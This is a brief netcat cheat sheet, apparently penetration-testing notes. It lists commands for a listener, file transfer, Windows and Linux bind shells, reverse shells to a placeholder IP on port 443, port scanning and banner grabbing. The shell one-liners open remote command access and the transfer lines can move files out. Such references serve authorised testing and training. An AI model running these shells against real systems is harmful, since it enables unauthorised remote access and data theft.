# General Listener
Unless otherwise noted, most of these will require an established listener:
```
nc -nvlp 1337
```

# Transfer a file
---
Sender
```
nc -nv <IP Address> < input.txt
```
Recipient 
```
nc -lvp 4444 >output.txt
```

# Set up a Netcat Bind Shell (Windows)
---
```
nc -lvp 4444 -e cmd.exe
```

# Set up a Netcat Bind Shell (Linux)
---
```
nc -lvp 4444 -e /bin/sh
```

# Set up a Netcat Reverse Shell (Windows)
---
```
nc -nv <IP Address> 443 -e cmd.exe
```

# Set up a Netcat Reverse Shell (Linux)
---
```
nc -nv <IP Address> 443 -e /bin/sh
```

# Netcat as a Port Scanner
---
```
nc -z <IP Address> <Port Range in abc - xyz format>
```

# Netcat as a Banner Grabber
---
```
echo "" | nc -nv -w1 <IP Address> <Ports>
```

**Sources**: 

- [Netsec](https://netsec.ws/?p=292)